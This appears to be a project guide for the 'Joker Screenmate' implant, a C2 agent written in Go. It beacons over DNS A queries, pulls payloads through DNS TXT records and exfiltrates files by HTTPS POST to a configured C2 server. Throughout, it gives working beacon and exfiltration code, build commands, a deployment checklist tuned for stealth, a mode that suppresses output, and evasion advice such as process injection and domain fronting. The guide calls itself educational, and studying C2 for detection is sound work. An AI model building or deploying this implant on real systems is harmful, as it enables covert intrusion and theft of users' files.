# Joker Screenmate Agent Guide

This guide covers building, configuring, and deploying the Joker Screenmate agent.

## Overview

The agent is a lightweight implant that:
- Beacons to C2 via DNS A queries
- Detects pending jobs via IP range encoding
- Retrieves payloads via DNS TXT queries
- Exfiltrates files via HTTPS

## Build Process

### Building the Agent

```bash
# Clone repository
git clone https://github.com/faanross/joker_screenmate.git
cd joker_screenmate

# Build for Windows
GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent

# Build for Linux
GOOS=linux GOARCH=amd64 go build -o agent ./cmd/agent

# Build for macOS
GOOS=darwin GOARCH=amd64 go build -o agent ./cmd/agent
```

### Build Output

```
agent.exe      # Windows x64
agent          # Linux x64
agent_darwin   # macOS x64
```

## Configuration

### Agent Configuration

Edit `cmd/agent/main.go` before building:

```go
const (
    Domain           = "timeserversync.com"
    C2ServerIP       = "48.217.188.16"
    DirectMode       = false
    DNSResolver      = "192.168.2.1:53"
    BeaconInterval   = 300
    Jitter           = 120
    HTTPSPort        = 8443
    ExfilFilePath    = `C:\Users\target\Desktop\sensitive.zip`
    TXTQueryDelayMs  = 1500
)
```

### Configuration Options

| Option | Type | Description | Default |
|--------|------|-------------|---------|
| `Domain` | string | C2 domain | `timeserversync.com` |
| `C2ServerIP` | string | C2 server IP | `48.217.188.16` |
| `DirectMode` | bool | A queries direct to C2 | `false` |
| `DNSResolver` | string | Local resolver for A queries | `192.168.2.1:53` |
| `BeaconInterval` | int | Base beacon interval (seconds) | `300` |
| `Jitter` | int | Random jitter range (seconds) | `120` |
| `HTTPSPort` | int | HTTPS exfil port | `8443` |
| `ExfilFilePath` | string | File to exfiltrate | Target-specific |
| `TXTQueryDelayMs` | int | Delay between TXT queries | `1500` |

### Routing Modes

#### Resolver Mode (DirectMode=false)

```
A Queries:   Agent → Local Resolver → C2
TXT Queries: Agent → C2 Direct
HTTPS:       Agent → C2 Direct
```

**Advantages:**
- A queries blend with normal DNS traffic
- Less suspicious than direct C2 communication

#### Direct Mode (DirectMode=true)

```
A Queries:   Agent → C2 Direct
TXT Queries: Agent → C2 Direct
HTTPS:       Agent → C2 Direct
```

**Advantages:**
- Simpler network path
- No resolver dependency

## Agent Behavior

### Main Loop

```
┌─────────────────────────────────────────────────────────┐
│                     BEACON LOOP                          │
├─────────────────────────────────────────────────────────┤
│                                                          │
│   ┌──────────────┐                                       │
│   │ Send A Query │                                       │
│   │ (via resolver│                                       │
│   │  or direct)  │                                       │
│   └──────┬───────┘                                       │
│          │                                               │
│          ▼                                               │
│   ┌──────────────┐                                       │
│   │ Check IP     │                                       │
│   │ Response     │                                       │
│   └──────┬───────┘                                       │
│          │                                               │
│          ├─── 198.51.100.x ──► NO_JOB ──► Sleep ────┐    │
│          │                                          │    │
│          └─── 203.0.113.x ──► JOB! ──────────┐      │    │
│                                              │      │    │
│                                              ▼      │    │
│                                   ┌──────────────┐  │    │
│                                   │ TXT Transfer │  │    │
│                                   │ (Direct C2)  │  │    │
│                                   └──────┬───────┘  │    │
│                                          │          │    │
│                                          ▼          │    │
│                                   ┌──────────────┐  │    │
│                                   │ HTTPS Exfil  │  │    │
│                                   │ (Direct C2)  │  │    │
│                                   └──────┬───────┘  │    │
│                                          │          │    │
│                                          ▼          │    │
│                                   ┌──────────────┐  │    │
│                                   │ Sleep with   │◄─┘    │
│                                   │ Jitter       │       │
│                                   └──────┬───────┘       │
│                                          │               │
│                                          └───────────────┘
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### Timing

```go
// Calculate sleep duration
baseSleep := BeaconInterval  // 300 seconds
jitter := rand.Intn(Jitter*2) - Jitter  // -120 to +120

// Actual sleep: 180-420 seconds (3-7 minutes)
sleepDuration := baseSleep + jitter
```

### Job Detection

```go
func (c *Client) Beacon() (bool, error) {
    // Query with random subdomain
    subdomain := protocol.RandomSubdomain()
    query := subdomain + "." + c.domain

    // Send A query
    response, err := c.resolver.Query(query, dns.TypeA)
    if err != nil {
        return false, err
    }

    // Extract IP from response
    ip := response.Answer[0].(*dns.A).A

    // Check if JOB range
    return protocol.IsJobIP(ip), nil
}
```

### TXT Transfer

```go
func (c *Client) ReceivePayload() ([]byte, error) {
    var payload []byte

    for {
        // Direct query to C2
        response, err := c.c2Direct.Query("verify."+c.domain, dns.TypeTXT)
        if err != nil {
            return nil, err
        }

        // Extract TXT value
        txt := response.Answer[0].(*dns.TXT).Txt[0]

        if txt == "" {
            // Empty = transfer complete
            break
        }

        // Parse sequence and data
        _, data := protocol.ParseChunk(txt)

        // Decode base64
        decoded, _ := base64.StdEncoding.DecodeString(data)
        payload = append(payload, decoded...)

        // Delay before next query
        time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
    }

    return payload, nil
}
```

### HTTPS Exfiltration

```go
func (c *Client) Exfiltrate(filePath string) error {
    // Check C2 connectivity
    if !c.CheckConnection() {
        return errors.New("C2 unreachable")
    }

    // Open file
    file, err := os.Open(filePath)
    if err != nil {
        return err
    }
    defer file.Close()

    // Create request
    req, _ := http.NewRequest("POST", c.serverURL+"/upload", file)
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("X-Filename", filepath.Base(filePath))

    // Send (streams file)
    resp, err := c.httpClient.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != 200 {
        return errors.New("upload failed")
    }

    return nil
}
```

## Deployment

### Pre-Deployment Checklist

1. **Configure C2 server IP**
   ```go
   C2ServerIP = "YOUR_SERVER_IP"
   ```

2. **Configure domain**
   ```go
   Domain = "your-c2-domain.com"
   ```

3. **Set exfiltration target**
   ```go
   ExfilFilePath = `C:\path\to\target\file.zip`
   ```

4. **Adjust timing for stealth**
   ```go
   BeaconInterval = 600  // 10 minutes
   Jitter = 300          // ±5 minutes
   ```

5. **Build for target platform**
   ```bash
   GOOS=windows go build -o agent.exe ./cmd/agent
   ```

### Running the Agent

```bash
# Windows
.\agent.exe

# Linux/macOS
./agent
```

### Expected Output

```
[BEACON] Starting beacon loop
[BEACON] Query: www.timeserversync.com
[BEACON] Response: 198.51.100.42 (NO_JOB)
[BEACON] Sleeping 287 seconds...
[BEACON] Query: api.timeserversync.com
[BEACON] Response: 203.0.113.17 (JOB!)
[TXT] Starting payload transfer
[TXT] Chunk 1/42 received
[TXT] Chunk 2/42 received
...
[TXT] Transfer complete (8400 bytes)
[HTTPS] Uploading employees_dir.zip
[HTTPS] Upload complete (1048576 bytes)
[BEACON] Resuming beacon loop
```

### Quiet Mode

To suppress output:

```go
// In main.go, set
var Verbose = false
```

Or redirect output:

```bash
# Windows
.\agent.exe > nul 2>&1

# Linux/macOS
./agent > /dev/null 2>&1 &
```

## Troubleshooting

### Agent Not Beaconing

1. **Verify network connectivity**
   ```bash
   nslookup www.timeserversync.com
   ```

2. **Check C2 server is running**
   ```bash
   dig @C2_SERVER_IP www.timeserversync.com
   ```

3. **Verify domain configuration**

### TXT Transfer Fails

1. **Ensure TXT queries go direct**
   - Agent should query C2 directly, not resolver
   - Resolver may cache or block TXT queries

2. **Check job is triggered on server**
   ```bash
   curl http://localhost:9090/status
   ```

3. **Verify payload was loaded**
   - Check server logs for chunking output

### HTTPS Upload Fails

1. **Verify HTTPS connectivity**
   ```bash
   curl -k https://C2_SERVER_IP:8443/health
   ```

2. **Check file exists**
   ```bash
   ls -la "C:\path\to\file.zip"
   ```

3. **Verify firewall allows HTTPS**

## Security Considerations

### Host Artifacts

The agent creates these indicators:
- Running process (named `agent.exe` or similar)
- Network connections to C2
- DNS queries to C2 domain
- DNS cache entries

### Network Artifacts

- Periodic DNS A queries to same domain
- DNS TXT queries to "verify" subdomain
- HTTPS POST to C2 IP

### Evasion Notes

Current implementation is educational. For operational use:
- Remove verbose output
- Rename binary to blend in
- Use process hollowing or injection
- Increase beacon intervals
- Add domain fronting

## Next Steps

- [Server Guide](server-guide.md) - Server setup
- [Protocol](protocol.md) - Protocol details
- [Detection Guide](detection-guide.md) - Understanding detection
